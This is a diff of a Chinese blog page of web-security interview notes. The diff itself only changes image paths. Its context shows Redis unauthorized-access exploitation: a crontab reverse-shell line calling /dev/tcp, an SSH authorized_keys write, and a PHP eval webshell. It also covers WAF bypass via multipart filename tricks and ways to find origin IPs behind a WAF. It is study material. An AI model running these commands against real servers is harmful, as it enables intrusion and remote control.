@@ -87,18 +87,18 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="0x01 API接口测试👇Here 干货满满 1. 接口定义本质：数据的传输与接收 2. 接口类型2.1 RPC（Remote Procedure Call远程过程调用）如Java RMI 2.2 RESTful API REST，全称是 Resource Representational State Transfer，通俗来讲就是，资源在网络中以某种表现形式进行状态转移。分解开来：  Reso">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/1.png">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/2.png">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/3.png">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/4.png">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/5.png">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/6.png">
-<meta property="og:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/7.png">
-<meta property="og:updated_time" content="2020-03-16T12:11:56.206Z">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/1.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/2.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/3.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/4.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/5.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/6.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/7.png">
+<meta property="og:updated_time" content="2020-03-16T12:15:54.060Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全面试准备二">
 <meta name="twitter:description" content="0x01 API接口测试👇Here 干货满满 1. 接口定义本质：数据的传输与接收 2. 接口类型2.1 RPC（Remote Procedure Call远程过程调用）如Java RMI 2.2 RESTful API REST，全称是 Resource Representational State Transfer，通俗来讲就是，资源在网络中以某种表现形式进行状态转移。分解开来：  Reso">
-<meta name="twitter:image" content="http://m3lon.github.io/Users/m3lon/blog/source/_posts/Web安全面试准备二/1.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2020/03/16/Web安全面试准备二/1.png">
 
 
 
@@ -501,7 +501,7 @@
 <ol start="3">
 <li>协程：与操作系统内核无关，只与程序有关。</li>
 </ol>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/1.png" alt="img"></p>
+<p><img src="1.png" alt="img"></p>
 <h3 id="0x03-未授权漏洞"><a href="#0x03-未授权漏洞" class="headerlink" title="0x03 未授权漏洞"></a>0x03 未授权漏洞</h3><h4 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1. redis未授权"></a>1. redis未授权</h4><h5 id="1-1-crontab写计划任务反弹shell"><a href="#1-1-crontab写计划任务反弹shell" class="headerlink" title="1.1 crontab写计划任务反弹shell"></a>1.1 crontab写计划任务反弹shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.2.6</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
 <h5 id="1-2-写ssh公钥远程连接"><a href="#1-2-写ssh公钥远程连接" class="headerlink" title="1.2 写ssh公钥远程连接"></a>1.2 写ssh公钥远程连接</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli -h 192.168.1.11</span><br><span class="line">192.168.1.11:6379&gt; config <span class="built_in">set</span> dir /Users/antirez/.ssh/</span><br><span class="line">OK</span><br><span class="line">192.168.1.11:6379&gt; config get dir</span><br><span class="line">1) <span class="string">"dir"</span></span><br><span class="line">2) <span class="string">"/Users/antirez/.ssh"</span></span><br><span class="line">192.168.1.11:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line">192.168.1.11:6379&gt; save</span><br></pre></td></tr></table></figure>
 <h5 id="1-3-写入webshell"><a href="#1-3-写入webshell" class="headerlink" title="1.3 写入webshell"></a>1.3 写入webshell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['caidao']);?&gt;"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
@@ -512,7 +512,7 @@
 <h3 id="0x04-业务逻辑漏洞"><a href="#0x04-业务逻辑漏洞" class="headerlink" title="0x04 业务逻辑漏洞"></a>0x04 业务逻辑漏洞</h3><p><a href="https://github.com/PyxYuYu/MyBlog/issues/102" target="_blank" rel="noopener">https://github.com/PyxYuYu/MyBlog/issues/102</a></p>
 <h3 id="0x05-WAF绕过"><a href="#0x05-WAF绕过" class="headerlink" title="0x05 WAF绕过"></a>0x05 WAF绕过</h3><p><a href="https://www.cnblogs.com/hookjoy/p/5778418.html" target="_blank" rel="noopener">👇这里</a></p>
 <h4 id="1-架构层绕过WAF"><a href="#1-架构层绕过WAF" class="headerlink" title="1. 架构层绕过WAF"></a>1. 架构层绕过WAF</h4><h5 id="1-1-寻找源站"><a href="#1-1-寻找源站" class="headerlink" title="1.1 寻找源站"></a>1.1 寻找源站</h5><p>例如百度云加速、360安全卫士等，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。如图，liusscs.com接入接入WAF后，liusscs.comd的DNS解析结果指向WAF集群，用户的请求将发送给WAF集群，WAF集群经过检测认为非攻击请求再转发给源站。</p>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/2.png" alt="image-20190828144040058"></p>
+<p><img src="2.png" alt="image-20190828144040058"></p>
 <p>针对云WAF架构，通过ip地址：没有dns解析就没有waf集群，直接到达源站：CTF中一种套路</p>
 <p>—&gt; 寻找真实ip</p>
 <ul>
@@ -535,9 +535,9 @@
 <li>​    Content-Type: multipart/form-data;</li>
 </ul>
 <p>Waf未能覆盖Content-Type: multipart/form-data从而导致被绕过。或者WAF会认为它是文件上传请求，从而只检测文件上传，导致被绕过。如图，加速乐的WAF就存在被绕过的情况，是典型的协议未覆盖。</p>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/3.png" alt="image-20190828155740209"></p>
+<p><img src="3.png" alt="image-20190828155740209"></p>
 <h5 id="3-2-利用协议解析不一致绕过"><a href="#3-2-利用协议解析不一致绕过" class="headerlink" title="3.2 利用协议解析不一致绕过"></a>3.2 利用协议解析不一致绕过</h5><p><a href="https://weibo.com/ttarticle/p/show?id=2309404002575157473609" target="_blank" rel="noopener">参考</a></p>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/4.png" alt="image-20190828160429017"></p>
+<p><img src="4.png" alt="image-20190828160429017"></p>
 <h5 id="3-3-协议解析不正确"><a href="#3-3-协议解析不正确" class="headerlink" title="3.3 协议解析不正确"></a>3.3 协议解析不正确</h5><ul>
 <li><p><strong>文件名被覆盖一</strong>：在multipart协议中，一个文件上传块存在多个Content-Disposition，将以最后一个Content-Disposition的filename值作为上传的文件名，许多WAF解析到第一个Content-Disposition就认为协议解析完毕，获得上传的文件名，从而导致被绕过。</p>
 </li>
@@ -545,7 +545,7 @@
 <p>Content-Disposition: form-data;name=”myfile”; filename=”p3.txt”;filename=”t3.jsp”</p>
 </li>
 <li><p><strong>未解析所有文件</strong>：multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。</p>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/5.png" alt="image-20190828161247055"></p>
+<p><img src="5.png" alt="image-20190828161247055"></p>
 </li>
 <li><p><strong>协议解析不一致</strong>-文件名解析兼容性：multipart协议中，文件名的形式为filename=”abc.php”。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 filename=”abc.php、filename=abc.php”、 ”filename=’abc.php’。而<strong>WAF只按照协议标准去解析，无法解析文件名</strong>，但是<strong>后端容器能正确获得文件名，从而导致被绕过</strong>。场景的绕过形式：</p>
 <ul>
@@ -582,7 +582,7 @@
 <li>敏感信息泄漏：phpinfo敏感信息泄露、Apache status和Jboss status敏感信息泄露、网页源代码泄露、svn信息泄露信、github信息泄露等。</li>
 <li>web漏洞：使服务器主动与我们建立联系：ssrf、xss、命令执行</li>
 </ul>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/6.png" alt="img"></p>
+<p><img src="6.png" alt="img"></p>
 </li>
 <li><p>历史域名绑定</p>
 <p>查询IP和历史域名绑定记录，有在线的查询网站</p>
@@ -623,7 +623,7 @@
 </ol>
 <p>关键在于如何保证对称密钥的安全传输的？</p>
 <p>CA证书保证服务器端公钥的安全传输 （CA证书由权威机构颁发，可以信任）</p>
-<p><img src="/Users/m3lon/blog/source/_posts/Web安全面试准备二/7.png" alt="img"></p>
+<p><img src="7.png" alt="img"></p>
 <h3 id="0x08-SSRF"><a href="#0x08-SSRF" class="headerlink" title="0x08 SSRF"></a>0x08 SSRF</h3><p>本质：服务器提供了从其他服务器获取数据的功能但没有对目标地址做过滤</p>
 <p>云环境：支持远程代码部署、远程图片请求、数据同步、博客迁移、ffpmg</p>
 <p>场景：（调取第三方服务）翻译、图片/文章收藏、图片加载/下载、编码处理、文件处理如ffpmg，ImageMagick，docx，pdf，xml、网站采集（针对输入的网站进行信息收集）</p>
